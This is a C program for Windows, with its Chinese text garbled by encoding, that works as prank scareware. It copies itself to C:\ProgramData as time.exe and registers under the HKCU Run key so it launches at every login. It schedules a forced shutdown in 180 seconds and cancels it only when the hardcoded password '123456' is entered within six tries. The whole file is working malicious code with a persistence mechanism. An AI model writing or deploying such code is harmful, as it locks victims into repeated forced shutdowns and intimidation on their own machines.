#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#define MAXPATH 1024
int main(void)
{
	
	int a;
	char m[7] = "123456";//��������
	char p[7] = { 0 };
	
	//�޸�ע���ʹ���򿪻��Զ����� 
	char buffer[MAXPATH];//��ȡ����ǰ���ڵ�Ŀ¼
	char copy[MAXPATH] = "copy \"" ;
	char path[MAXPATH] = "\\time.exe\" C:\\ProgramData /y";
	char *szSubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; //ϵͳ������·�� 
	char *time = "C:\\ProgramData\\time.exe";

	HKEY hKey;
	_getcwd(buffer, MAXPATH);
			strcat(copy, buffer);
			strcat(copy, path);
			system(copy);		
			//��ע���
			if (RegOpenKeyEx(HKEY_CURRENT_USER, szSubKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
			{  //���һ����Key,������ֵ��"timec"�����ƣ����Լ�����
				RegSetValueEx(hKey, "timecyincang", 0, REG_SZ, (BYTE *)time, strlen(time));
				RegCloseKey(hKey);//�ر�ע���
			}
	
	system("title ��ֹ�˳������򣬷�����ĵ��Ի���ƨ��");
	system("mode con:cols=70 lines=25");//���ô��ڴ�С 
	system("shutdown -s -t 180");//�ػ����� 
	system("color 04"); //���ô�����ɫ
	printf("\n\n\n\n\n\n��ĵ������˲�������ֹ�˳������򣬷�����ĵ��Ի���ƨ������\n\n");
	printf("\t\t��ܰ��ʾ������180���ʱ���������롣\n\n\n\t\t\t");
	system("pause");
	system("cls"); 
	for(a=5;a>=0;a--) //forѭ��
	{
		printf("\n\n��ܰ��ʾ����ֻʣ��%d�λ��ᡣ\n",a);
		printf("���������루�������������˰��س���:");
		gets(p);

		if (strcmp(m, p) == 0)//��������бȽ�
		{
			system("color 0f");
			printf("\n\n\t\t��ϲ�㣬������ȷ����ĵ��Բ�����ƨ��\n\n");
			system("shutdown -a");
			system("pause");
			 exit(0);  //���� Ҳ����return 0;
		}
		else
		{
			printf("\n\t\t�������\n");
			system("color 0c");  //����������ɫ
		}
	}
		system("color 0a");
		system("pause"); 
		system("cls");
		printf("\n\n\n\n\n\n\t������������5��,��ĵ��Խ���ƨ����װϵͳ�ɣ�\n\n\n");
	system("pause");
	return 0;
}
